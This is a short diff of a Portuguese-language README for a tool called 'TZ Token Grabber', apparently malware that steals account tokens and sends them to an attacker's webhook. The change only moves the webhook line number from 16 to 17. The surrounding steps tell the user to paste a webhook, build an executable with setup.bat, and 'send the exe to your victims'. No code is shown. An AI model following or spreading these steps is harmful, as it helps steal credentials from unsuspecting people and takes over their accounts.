@@ -29,7 +29,7 @@ Amor ❌ código ✅
 
 ### 📁・Configurando o TZ Token Grabber
 1. Comece instalando [python](https://www.python.org/) ofc
-2. abra main.py com qualquer editor de código de sua escolha e cole seu webhook na linha 16 (ou substitua "SUA_WEBHOOK" pelo webhook)
+2. abra main.py com qualquer editor de código de sua escolha e cole seu webhook na linha 17 (ou substitua "SUA_WEBHOOK" pelo webhook)
 3. execute o `setup.bat` e deixe-o fazer suas coisas
 4. uma janela deve aparecer pedindo o nome do exe e depois de corrigir tudo isso, você deve ter o seu exe
 5. envie exe para suas vítimas 😈
